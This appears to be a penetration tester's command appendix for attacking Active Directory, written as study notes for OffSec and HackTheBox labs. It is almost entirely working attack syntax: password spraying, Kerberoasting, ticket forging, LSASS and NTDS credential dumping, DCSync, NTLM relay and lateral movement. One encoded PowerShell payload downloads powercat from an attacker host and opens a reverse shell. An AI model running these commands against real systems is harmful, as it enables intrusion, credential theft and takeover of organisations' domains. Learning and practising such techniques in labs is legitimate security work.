# Active Directory Command Appendix

Pure syntax reference, phase-ordered coverage is in [[Active Directory Methodology]], teardowns in [[Active Directory (Breakdowns)]], decision logic in [[Active Directory (Decision Tree)]].

Cross-links: [[22. Active Directory Introduction and Enumeration]] (see also [[23. Attacking Active Directory Authentication]], [[24. Lateral Movement in Active Directory]])

---

## External Recon

```bash
# DNS TXT record lookup
nslookup -type=TXT DOMAIN.LOCAL <nameserver>

# Extract DC FQDN from TLS cert on RDP/LDAPS (no auth required)
sudo nmap -A -sV -p 3389,636,443 <DC_IP> | grep -i "commonname\|CN="

# Parse grepable nmap for hosts with a specific port open
awk '/1433\/open/ {print $2}' nmap_output.txt
```

---

## LLMNR/NBT-NS Poisoning

```bash
# From Linux (Kali) — Responder
sudo responder -I <interface> -wF

# Crack captured NTLMv2
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

```powershell
# From Windows foothold — Inveigh
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
# After stopping: type Inveigh-NTLMv2.txt
```

---

## Password Policy

```bash
# Linux (authenticated)
crackmapexec smb <DC_IP> -u user -p pass --pass-pol
rpcclient -U "DOMAIN\\user%pass" <DC_IP> -c "getdompwinfo"
enum4linux -P <DC_IP>
```

```powershell
# Windows (PowerView)
(Get-DomainPolicy)."system access"
```

---

## Username Enumeration

```bash
# kerbrute (no lockout risk)
kerbrute userenum -d DOMAIN.LOCAL --dc <DC_IP> users.txt

# rpcclient individual user by RID (hex)
rpcclient -U "DOMAIN\\user%pass" <DC_IP> -c "queryuser 0x457"
```

---

## Password Spraying

Always check policy first: `net accounts` → note Lockout threshold and Lockout observation window. Stay at threshold-1 attempts per window.

```bash
# Linux — kerbrute (Kerberos AS-REQ, fastest, no SMB noise)
kerbrute passwordspray -d DOMAIN.LOCAL --dc <DC_IP> users.txt 'Password123!'

# Linux — crackmapexec (SMB, noisy, but shows (Pwn3d!) for local admin)
crackmapexec smb <target> -u users.txt -p 'Password123!' -d DOMAIN.LOCAL --continue-on-success
# Spray one user across all hosts: -u pete -p 'Nexus123!' (to find local admin)
```

```powershell
# Windows — Spray-Passwords.ps1 (LDAP/ADSI, low noise)
cd C:\Tools
powershell -ep bypass
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin   # -Admin includes admin accounts
# Look for: Guessed password for user: 'pete' = 'Nexus123!'

# Windows — DomainPasswordSpray (auto-pulls user list from AD)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Winter2022 -Outfile spray_success.txt -ErrorAction SilentlyContinue
```

> Capstone hashcat rule file (3 rules, pass-through, append "1", append "!"):
> `printf ':\n$1\n$!\n' > /home/kali/capstone.rule`

---

## Credentialed Enumeration

```bash
# CME: groups with member counts
crackmapexec smb <DC_IP> -u user -p pass --groups

# CME: shares
crackmapexec smb <DC_IP> -u user -p pass --shares

# CME: logged-on users
crackmapexec smb <DC_IP> -u user -p pass --loggedon-users

# bloodhound-python remote collection
bloodhound-python -d DOMAIN.LOCAL -u user -p pass -ns <DC_IP> -c all
zip -r bh_data.zip *.json
```

```powershell
# PowerView — core enumeration
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetDomainController
Get-DomainUser | select samaccountname,lastlogon
Get-DomainGroup "Domain Admins" | select member
Get-DomainComputer | select dnshostname,operatingsystem
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Test local admin access
Test-AdminAccess -ComputerName <hostname>

# SPN enumeration
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
setspn -Q */*

# UAC flag hunting
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter PASSWD_NOTREQD
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}

# Domain SID
Get-DomainSID

# Trust mapping
Get-DomainTrustMapping
```

```cmd
:: Windows built-in (no tools)
net user /domain
net group /domain
net localgroup Administrators
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount>=1)(description=*))" -attr samAccountName description -limit 50
Get-MpComputerStatus
netdom query /domain:DOMAIN.LOCAL trust
```

---

## Manual LDAP Enumeration (no PowerView, no RSAT)

Works from any domain-joined machine with standard domain user credentials.

```powershell
# Build the LDAP path from scratch
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN  = ([adsi]'').distinguishedName          # → DC=corp,DC=com
$LDAP = "LDAP://$PDC/$DN"                   # → LDAP://DC1.corp.com/DC=corp,DC=com

# Reusable function (save as function.ps1, Import-Module .\function.ps1)
function LDAPSearch {
    param ([string]$LDAPQuery)
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DN  = ([adsi]'').distinguishedName
    $DE  = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DN")
    $DS  = New-Object System.DirectoryServices.DirectorySearcher($DE, $LDAPQuery)
    return $DS.FindAll()
}

# Common filter examples
LDAPSearch -LDAPQuery "(samAccountType=805306368)"           # all users (0x30000000)
LDAPSearch -LDAPQuery "(objectclass=group)"                  # all groups

# Groups + members — shows nested group objects (net.exe misses these)
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
    $group.properties | select {$_.cn}, {$_.member}
}

# Specific group — exposes nested group members
$g = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
$g.properties.member

# Dump all attributes of a specific user (flag in description, physicaldeliveryofficename, etc.)
$u = LDAPSearch -LDAPQuery "(samAccountName=michelle)"
$u.properties
```

Source: [[22. Active Directory Introduction and Enumeration#22.2.3 Adding Search Functionality to our Script|Module 22 §22.2.3]]

---

## Domain Shares & SYSVOL

```powershell
# Find all shares across all domain computers (PowerView)
Find-DomainShare

# Filter to shares readable by the current user
Find-DomainShare -CheckShareAccess

# Walk SYSVOL — readable by all domain users; look for GPP XML files
ls \\dc1.corp.com\sysvol\corp.com\
ls \\dc1.corp.com\sysvol\corp.com\Policies\
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
# Look for: <cpassword> (encrypted password) and <userName> (account name)
```

```cmd
:: Search all of SYSVOL for cpassword fields (cmd — no PowerView needed)
findstr /S /I "cpassword" \\dc1.corp.com\sysvol\corp.com\
```

```bash
# Decrypt GPP cpassword on Kali (AES key is publicly known — MS13-039)
gpp-decrypt "<base64_cpassword_string>"
# Output: plaintext password
```

```powershell
# Enumerate a specific custom share for leaked credentials/files
ls \\FILES04\docshare\docs\do-not-share
cat \\FILES04\docshare\docs\do-not-share\start-email.txt
```

Source: [[22. Active Directory Introduction and Enumeration#22.3.5 Enumerating Domain Shares|Module 22 §22.3.5]]

---

## ACL Enumeration

```powershell
# Get current user's SID
$sid = Convert-NameToSid <username>

# Enumerate ACLs where current user has access
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Scope to OU for speed
Get-DomainObjectACL -ResolveGUIDs -Identity * -domain DOMAIN.LOCAL \
  -SearchBase "LDAP://OU=Users,DC=DOMAIN,DC=LOCAL"
```

GUID to know: `00299570-246d-11d0-a768-00aa006e0529` = User-Force-Change-Password

```powershell
# Module 22 style — simpler ACL scan, no -ResolveGUIDs needed for GenericAll/GenericWrite checks
Get-ObjectAcl -Identity stephanie                      # all ACEs on one object
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

# Convert SID to name (single)
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
# CORP\stephanie

# Pipe multiple SIDs for bulk conversion
"S-1-5-21-...-512","S-1-5-21-...-1104","S-1-5-32-548","S-1-5-18" | Convert-SidToName

# Get current user's SID (for filtering ACL output by who holds the right)
$sid = Convert-NameToSid stephanie
```

---

## ACL Abuse Chain

```powershell
# Simple GenericAll abuse — when already running AS the account that holds the ACE (no PSCredential needed)
# GenericAll on a group → add any user
net group "Management Department" stephanie /add /domain
net group "Management Department" stephanie /del /domain    # cleanup

# GenericAll on a user → reset their password (net user works because GenericAll includes password reset)
net user robert Password123! /domain

# Confirm admin access with the new creds, then use Invoke-Command
$pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("corp\robert", $pass)
Invoke-Command -ComputerName client74.corp.com -Credential $cred -ScriptBlock {whoami}

# Get flag via UNC admin shares (use if RDP session blocks direct path — UAC token filtering)
type "\\client74\c$\Users\administrator\Desktop\proof.txt"
```

Source: [[22. Active Directory Introduction and Enumeration#22.3.4 Enumerating Object Permissions|Module 22 §22.3.4 + Capstone]]

```powershell
# Step 1: ForceChangePassword
$passwd = ConvertTo-SecureString "victimpass" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\attacker', $passwd)
$newPass = ConvertTo-SecureString 'Pwn3d!' -AsPlainText -Force
Set-DomainUserPassword -Identity <target> -AccountPassword $newPass -Credential $Cred -Verbose

# Step 2: Add to group
$Cred2 = New-Object System.Management.Automation.PSCredential('DOMAIN\<target>', $newPass)
Add-DomainGroupMember -Identity 'Privileged Group' -Members '<target>' -Credential $Cred2 -Verbose

# Step 3: Set SPN for targeted Kerberoasting
Set-DomainObject -Credential $Cred2 -Identity <high_value_user> \
  -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# Step 4: Kerberoast
.\Rubeus.exe kerberoast /user:<high_value_user> /nowrap
# hashcat -m 13100

# Cleanup
Set-DomainObject -Credential $Cred2 -Identity <high_value_user> -Clear serviceprincipalname -Verbose
Remove-DomainGroupMember -Identity 'Privileged Group' -Members '<target>' -Credential $Cred2 -Verbose
```

---

## Kerberoasting

```bash
# Linux (direct DC access)
impacket-GetUserSPNs -request -dc-ip <DC_IP> DOMAIN.LOCAL/user:pass -outputfile hashes.kerberoast
# OR (older alias)
GetUserSPNs.py -request -dc-ip <DC_IP> DOMAIN.LOCAL/user:pass
# hashcat -m 13100 hashes.kerberoast rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# Linux (via SOCKS proxy — DC only reachable internally)
proxychains -q impacket-GetUserSPNs -request -dc-ip <DC_IP> DOMAIN.LOCAL/user:pass
# proxychains4.conf must point to your SOCKS5 proxy port (e.g. socks5 127.0.0.1 1081)
```

```cmd
:: Windows
.\Rubeus.exe kerberoast /nowrap /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:<specific_user> /nowrap
:: hashcat -m 13100
```

> 🕐 Clock sync (OffSec labs): if `KRB_AP_ERR_SKEW`, the Kali clock is >5 min off from the DC. Fix:
> 1. `nmap --script smb2-time <EXTERNAL_HOST>` — the `date:` field is **UTC** regardless of Kali's timezone. If Kali is in BST (UTC+1), add 1 hour to the UTC reading to get the correct local time to set.
> 2. `sudo timedatectl set-ntp false` — stops NTP overwriting the fix.
> 3. `sudo date -s "YYYY-MM-DD HH:MM:SS"` — set to adjusted local time.
> 4. Sync the clock **before** establishing any Chisel/SSH tunnel — a ~1-hour clock jump kills active WebSocket/TLS sessions.
> 5. Reconnect VPN if it dropped, then re-establish the tunnel, then run impacket.
> Using an external dual-homed host (e.g. MAILSRV1) for smb2-time avoids proxychains and is accurate enough (domain clocks synchronise).

---

## AS-REP Roasting

```bash
# Linux (no credentials needed if accounts have pre-auth disabled)
impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile asrep.hash DOMAIN.LOCAL/
# hashcat -m 18200 asrep.hash rockyou.txt
```

```cmd
:: Windows (Rubeus — format:hashcat required for hashcat compatibility)
.\Rubeus.exe asreproast /format:hashcat /nowrap
:: hashcat -m 18200
```

---

## Silver Ticket

Forge a service ticket using the SPN account's NTLM hash and the domain SID. No DC contact needed after the forge. Requires: SPN NTLM hash + domain SID + target SPN.

```cmd
:: Get domain SID (strip the trailing RID from whoami /user)
whoami /user
:: S-1-5-21-1987370270-658905905-1781884369-1105 → SID = S-1-5-21-1987370270-658905905-1781884369

:: Forge and inject silver ticket (kerberos::golden is the Mimikatz command for BOTH gold and silver)
mimikatz # kerberos::golden /ptt /sid:S-1-5-21-<domain_sid> /domain:corp.com ^
  /target:web04.corp.com /service:http /rc4:<SPN_NTLM_hash> /user:jeffadmin
:: /ptt = inject into current session immediately (no kerberos::ptt needed)
:: /user = any username — it's the identity the ticket claims (doesn't have to exist)
:: /service = Kerberos service class (http, cifs, host, ldap, ...)
:: /target = FQDN of the target server (not the DC)
:: /rc4 = NTLM hash of the SPN service account

:: Verify injection
klist
:: Look for: #1 service ticket for http/web04.corp.com

:: Use the ticket
iwr -UseDefaultCredentials http://web04
```

Source: [[23. Attacking Active Directory Authentication#23.2.4 Silver Tickets|Module 23 §23.2.4]]

---

## NTLM Relay — impacket-ntlmrelayx

Relays inbound NTLM authentication to a second target. Requires: (1) a way to trigger outbound SMB/HTTP auth from a host (UNC path in app config, Responder poisoning, print spool trigger, etc.), (2) the second target has SMB signing **disabled**.

```bash
# Relay SMB auth to a single target, run a command via SCM as the relayed user
sudo impacket-ntlmrelayx \
  --no-http-server \
  -smb2support \
  -t <TARGET_IP> \
  -c "powershell -enc <BASE64_PAYLOAD>"

# Relay to multiple targets simultaneously (drop any reachable admin-level target)
sudo impacket-ntlmrelayx -smb2support -tf targets.txt

# Interactive shell mode (opens a mini SMB shell instead of running -c)
sudo impacket-ntlmrelayx -smb2support -t <TARGET_IP> -i

# Dump SAM via relay (no -c needed; ntlmrelayx does it automatically when it gains admin)
sudo impacket-ntlmrelayx -smb2support -t <TARGET_IP>
```

Build the `-c` base64 payload (UTF-16LE encoding required for PowerShell `-enc`):
```powershell
$Text  = "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI>:8888/powercat.ps1');powercat -c <KALI> -p 9999 -e powershell"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
[Convert]::ToBase64String($Bytes)
```

See [[27. Assembling the Pieces#27.5.2 NTLM Relay via WordPress Backup Migration Plugin|Assembling the Pieces#27.5.2 NTLM Relay via WordPress Backup Migration Plugin]] for the full chain.

---

## LSASS Dumping — comsvcs.dll MiniDump + pypykatz

Use when Defender kills Meterpreter kiwi / sekurlsa::logonpasswords. Requires SYSTEM on target.

```powershell
# Step 1 — get LSASS PID
Get-Process lsass

# Step 2 — dump via native Windows DLL (not flagged by Defender)
rundll32 C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\Windows\Temp\lsass.dmp full
# Silent = good. Verify:
dir C:\Windows\Temp\lsass.dmp   # → ~45-50 MB
```

```bash
# Step 3 — transfer to Kali via authenticated smbserver (see below)
# Step 4 — parse offline
pypykatz lsa minidump /tmp/share/lsass.dmp
# Look for: username, NT: <hash>, password: <cleartext>
```

See [[27. Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1|Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1]] for the full walkthrough.

---

## impacket-smbserver — Authenticated File Transfer

Port 445 must be free (kill ntlmrelayx or other SMB listeners first).

```bash
# Kali — host the share with credentials
mkdir /tmp/share
impacket-smbserver share /tmp/share -smb2support -username kali -password kali
```

```powershell
# Windows target — mount and copy
net use \\<KALI>\share /user:kali kali
copy C:\Windows\Temp\lsass.dmp \\<KALI>\share\lsass.dmp

# Or serve a file the other way (pull from Windows)
copy \\<KALI>\share\mimikatz.exe C:\Windows\Temp\mimikatz.exe
```

> Null-auth smbserver (no `-username/-password`) is blocked by modern Windows and Defender network protection. Always use credentials in lab environments.

---

## DCSync

```bash
# From Linux
impacket-secretsdump -dc-ip <DC_IP> DOMAIN.LOCAL/user:pass@<DC_IP>
# Or just one user:
impacket-secretsdump -dc-ip <DC_IP> -just-dc-user krbtgt DOMAIN.LOCAL/user:pass@<DC_IP>
```

```mimikatz
# From Windows (requires DS-Replication rights)
lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\krbtgt
# For reversible encryption cleartext:
lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\syncron
```

```cmd
:: runas /netonly to use domain creds from non-domain machine
runas /netonly /user:DOMAIN\user "cmd.exe"
:: Then run mimikatz lsadump::dcsync in the new window
```

---

## Privileged Access

```powershell
# WinRM with explicit creds
$passwd = ConvertTo-SecureString "password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $passwd)
Enter-PSSession -ComputerName <target> -Credential $cred
```

```bash
# MSSQL with Windows Authentication
mssqlclient.py DOMAIN.LOCAL/user:pass@<SQL_IP> -windows-auth
# Inside: enable_xp_cmdshell  →  xp_cmdshell whoami
```

---

## Bleeding Edge

```bash
# NoPac (CVE-2021-42278 + CVE-2021-42287)
python3 scanner.py DOMAIN.LOCAL/user:pass -dc-ip <DC_IP> -use-ldap
python3 noPac.py DOMAIN.LOCAL/user:pass -dc-ip <DC_IP> -use-ldap \
  -shell --impersonate administrator
```

---

## Domain Trust Attacks

```powershell
# Enumerate trusts
Get-DomainTrustMapping
netdom query /domain:DOMAIN.LOCAL trust

# Get child domain SID
Get-DomainSID

# Get Enterprise Admins SID from parent
Get-DomainObject -Identity "Enterprise Admins" -Domain PARENT.LOCAL
```

```mimikatz
# DCSync child KRBTGT
lsadump::dcsync /user:CHILD\krbtgt
```

```cmd
:: ExtraSids Golden Ticket (child→parent)
.\Rubeus.exe golden /rc4:<child_krbtgt_hash> /domain:CHILD.PARENT.LOCAL ^
  /sid:<child_sid> /sids:<enterprise_admins_sid> /user:hacker /ptt
klist
```

```bash
# Linux — raiseChild.py (automated)
impacket-raiseChild -target-exec DC01.PARENT.LOCAL CHILD.PARENT.LOCAL/Administrator:pass

# Cross-forest Kerberoasting (Linux)
GetUserSPNs.py -target-domain FOREIGN.LOCAL OUROWN.LOCAL/user:pass -dc-ip <DC_IP> -request
# hashcat -m 13100 → use creds: smbexec.py FOREIGN.LOCAL/user:pass@<foreign_ip>
```

```cmd
:: Cross-forest Kerberoasting (Windows)
.\Rubeus.exe kerberoast /domain:FOREIGN.LOCAL /rc4opsec /nowrap
```

---

---

## Lateral Movement (Module 24)

### WMI — CIM Session (modern, PowerShell)

```powershell
# Build credential object
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

# Create CIM session over DCOM (port 135 + high port)
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName <TARGET_IP> -Credential $credential -SessionOption $options

# Spawn process on target (Session 0 — no interactive window)
$command = 'powershell -nop -w hidden -e <base64_payload>'
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $command}
# ReturnValue = 0 → success. ProcessId = PID on target.
```

```cmd
:: Legacy wmic (still works, but deprecated)
wmic /node:<TARGET_IP> /user:domain\user /password:pass process call create "calc"
```

### WinRM — winrs one-liner

```cmd
:: winrs (requires Administrators or Remote Management Users on target)
winrs -r:<target_hostname> -u:domain\user -p:password "cmd /c hostname & whoami"
winrs -r:files04 -u:corp\jen -p:Nexus123! "powershell -nop -w hidden -e <base64>"
```

```powershell
# PowerShell Remoting
$credential = New-Object System.Management.Automation.PSCredential('corp\jen', $secureString)
New-PSSession -ComputerName <TARGET_IP> -Credential $credential
Enter-PSSession 1
```

### PsExec with credentials

```cmd
:: Requires: local admin on target + ADMIN$ share + File and Printer Sharing
C:\Tools\SysinternalsSuite\PsExec64.exe -i \\<target> -u corp\jen -p Nexus123! cmd
:: -i = interactive. Output: cmd prompt as corp\jen on target.
```

### Pass the Hash (impacket)

```bash
# impacket-wmiexec — semi-interactive shell (good for commands, not stable for interactive)
impacket-wmiexec -hashes :<NTLM_hash> domain/user@<TARGET_IP>
impacket-wmiexec -hashes :2892d26cdf84d7a70e2eb3b9f05c425e Administrator@192.168.50.73

# impacket-psexec — SYSTEM shell (drops binary, noisier)
impacket-psexec -hashes :<NTLM_hash> domain/user@<TARGET_IP>

# Other options (same -hashes syntax):
# impacket-smbexec, impacket-atexec

# With plaintext creds (no hash needed):
impacket-wmiexec domain/user:'password'@<TARGET_IP>
```

Note: Works for domain accounts and built-in local Administrator (RID 500). Other local admins blocked by KB2871997 (post-2014).

### Overpass the Hash (NTLM hash → Kerberos TGT)

```cmd
:: Step 1: Get NTLM hash from LSASS (elevated Mimikatz on current machine)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
:: Find target user's NTLM hash

:: Step 2: Spawn new process in that user's NTLM context
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
:: New PS window opens
```

```powershell
:: Step 3: In the NEW window — trigger AS-REQ/AS-REP to get a real TGT
net use \\files04              :: any network touch forces KDC exchange
klist                          :: now shows jen TGT + cifs/files04 TGS

:: Step 4: PsExec using HOSTNAME (not IP — IP forces NTLM and fails)
.\PsExec.exe \\files04 cmd
```

### Pass the Ticket

```cmd
:: Export all Kerberos tickets from all sessions (elevated Mimikatz)
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
:: Creates .kirbi files in current dir — filename encodes: user@service

:: Read filenames to identify useful tickets:
::   [0;xxxx]-0-0-...-dave@cifs-web04.kirbi → Group 0 = TGS for cifs/web04
::   [0;xxxx]-2-0-...-dave@krbtgt-CORP.COM.kirbi → Group 2 = TGT

:: Inject a ticket into the current session
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
klist     :: verify injection
ls \\web04\backup    :: access the service with dave's ticket
```

### DCOM — MMC20.Application lateral movement

```powershell
# Step 1: Instantiate MMC20.Application on the remote target
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<TARGET_IP>"))
# No output = success. Fails with exception if no DCOM/not admin.

# Step 2: Execute command (4 params: Command, Directory, Parameters, WindowState)
$dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c calc", "7")
# "7" = SHOWMINNOACTIVE (hidden). For reverse shell:
$dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "powershell -nop -w hidden -e <base64>", "7")
```

Note: No ADMIN$ share needed. Requires local admin on target. Traffic is COM over RPC (135 + high port).

### Golden Ticket

```cmd
:: Step 1: Get krbtgt hash (needs DA on DC — use DCSync or lsadump::lsa /patch)
mimikatz # lsadump::dcsync /user:corp\krbtgt
:: Or from DC directly: mimikatz # lsadump::lsa /patch  (noisier)
:: Note: also grab the domain SID from whoami /user (strip the RID)

:: Step 2: Purge existing tickets
mimikatz # kerberos::purge

:: Step 3: Forge golden ticket and inject (/ptt = immediate injection, no .kirbi file)
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
:: /user: MUST be an existing account (MS patch July 2022)
:: No /target or /service = TGT, not TGS = domain-wide

:: Step 4: Open cmd via Mimikatz (needed to use the injected TGT)
mimikatz # misc::cmd

:: Step 5: Use HOSTNAME (not IP)
C:\Tools\SysinternalsSuite\PsExec.exe \\dc1 cmd.exe
```

### Shadow Copy — full NTDS extraction chain

```cmd
:: Run on DC as Domain Admin

:: Step 1: Create persistent shadow copy of C:
C:\Tools\vshadow.exe -nw -p C:
:: -nw = no-writers (faster). -p = persistent (not deleted on exit).
:: Note the "Shadow copy device name" in output:
::   \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

:: Step 2: Copy locked ntds.dit via shadow copy device path
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

:: Step 3: Save SYSTEM hive (contains Boot Key to decrypt ntds.dit)
reg.exe save hklm\system c:\system.bak
```

```bash
# Step 4: Transfer to Kali and extract offline
scp Administrator@<DC_IP>:C:/ntds.dit.bak ./
scp Administrator@<DC_IP>:C:/system.bak ./
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
# Output: user:RID:LM:NT::: for every domain account
```

Source: [[24. Lateral Movement in Active Directory#24.2.2 Shadow Copies (VSS)|Module 24 §24.2.2]]

---

## Pass the Ticket (Linux -- ccache + keytab)

```bash
# Locate ccache tickets on a Linux host
find / -name krb5cc_* 2>/dev/null
env | grep KRB5CCNAME

# Set KRB5CCNAME to use a specific ticket
export KRB5CCNAME=/tmp/krb5cc_0
klist          # confirm which principal is loaded

# Import ccache into the current environment (if not auto-loaded)
export KRB5CCNAME=<path_to_ccache>

# Use with impacket tools
klist -k -t /etc/krb5.keytab                    # list keytab principals
kinit -k -t /etc/krb5.keytab <user@DOMAIN.COM>  # get TGT from keytab
impacket-wmiexec -k -no-pass DOMAIN.LOCAL/user@<TARGET_IP>  # use current ccache

# Extract keytab credentials (if readable)
python3 /opt/keytabextract.py /etc/krb5.keytab
# → AES256: ...  AES128: ...  NTLM: ...
```

Source: [[23. Attacking Active Directory Authentication#23.4.2|Module 23 §23.4.2 PtT Linux]]

---

## Shadow Credentials (pywhisker + PKINITtools)

Shadow Credentials abuses the `msDS-KeyCredentialLink` attribute. An attacker with write permissions on a target account adds a certificate key credential -- the target account can then pre-authenticate with that certificate rather than its password.

```bash
# Step 1: Add shadow credentials to a target account (requires GenericWrite or GenericAll)
python3 pywhisker.py -d DOMAIN.LOCAL -u attacker -p pass --target TARGET_USER --action add
# → Saves a .pfx file + prints the certificate password

# Step 2: Request a TGT using the certificate (PKINITtools)
# Fix oscrypto if needed: pip3 install -I git+https://github.com/wbond/oscrypto.git
python3 gettgtpkinit.py DOMAIN.LOCAL/TARGET_USER -cert-pfx cert.pfx -pfx-pass <cert_pass> ccache_file.ccache

# Step 3: Use the TGT to get the NT hash via U2U Kerberos request
python3 getnthash.py DOMAIN.LOCAL/TARGET_USER -key <session_key_from_gettgtpkinit>

# Step 4: Use the NT hash for PtH / PSRemoting
evil-winrm -i <TARGET_IP> -u TARGET_USER -H <NT_hash>
```

> 💡 ADCS ESC8 relay variant: `ntlmrelayx --adcs --template DomainController` → PFX output → use same PKINITtools flow to get DC TGT → DCSync.

Source: [[23. Attacking Active Directory Authentication#23.4.3|Module 23 §23.4.3 PtC/Shadow Credentials]]

---

## Extended Enumeration (HTB Techniques)

```powershell
# bloodhound-python -- remote collection from Linux (no agent on target needed)
# proxychains bloodhound-python -d DOMAIN.LOCAL -u user -p pass -ns <DC_IP> -c all
bloodhound-python -d DOMAIN.LOCAL -u user -p pass -ns <DC_IP> -c all --zip

# Snaffler -- find interesting files across all domain shares (-d = domain-wide search)
.\Snaffler.exe -s -d DOMAIN.LOCAL -o snaffler.log -v data

# DomainPasswordSpray.ps1 -- built-in policy-aware spraying (auto lockout protection)
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'Spring2024!' -OutFile spray_results.txt

# PASSWD_NOTREQD accounts
Get-DomainUser -UACFilter PASSWD_NOTREQD | select samaccountname,useraccountcontrol

# Reversible encryption accounts (cleartext retrievable via DCSync)
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}

# Living Off the Land -- AV/EDR status
Get-MpComputerStatus                                    # Windows Defender status
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# dsquery -- no PowerView needed, works natively on Windows Server
dsquery user -disabled
dsquery computer -name "DC*"
```

Source: [[22. Active Directory Introduction and Enumeration#22.6|Module 22 §22.6]] and [[24. Lateral Movement in Active Directory#24.4.1|Module 24 §24.4.1-24.4.2]]

---

## Forest: Anonymous enumeration and Account Operators DCSync chain

```bash
# Compare anonymous RPC and LDAP user lists. They may not match.
rpcclient -U '' -N $BoxIP -c 'enumdomusers'
ldapsearch -x -H ldap://$BoxIP -b "DC=htb,DC=local" '(&(objectCategory=person)(objectClass=user))' sAMAccountName

# Faster user collection when anonymous LDAP is available
windapsearch -d $Domain --dc-ip $BoxIP -U

# Request AS-REP tickets without manually building a user file
impacket-GetNPUsers $Domain/ -dc-ip $BoxIP -no-pass -request -format hashcat -outputfile $LootDir/asrep.txt
hashcat -m 18200 $LootDir/asrep.txt $Wordlist
```

```bash
# Create a controlled domain user after confirming Account Operators membership.
netexec winrm $BoxIP -u $Username -p $Password -d $Domain -X "net user $Username2 $Password2 /add /domain"
netexec winrm $BoxIP -u $Username -p $Password -d $Domain -X "net group \"Exchange Windows Permissions\" $Username2 /add /domain"

# Grant replication rights from Kali using the refreshed controlled account.
bloodyAD -d $Domain -u $Username2 -p $Password2 -H $BoxIP -i $BoxIP add dcsync $Username2

# Extract NTDS hashes when the account has DCSync rights.
netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds

# Validate an extracted Administrator hash without cracking it.
netexec smb $BoxIP -u Administrator -H $NTHash -d $Domain
evil-winrm -i $BoxIP -u Administrator -H $NTHash
```

Keep the AS-REP and NTDS output files private. GetNPUsers may write a successful ticket to its output file without printing a clear success line. On a domain controller, use domain authentication rather than `--local-auth`.

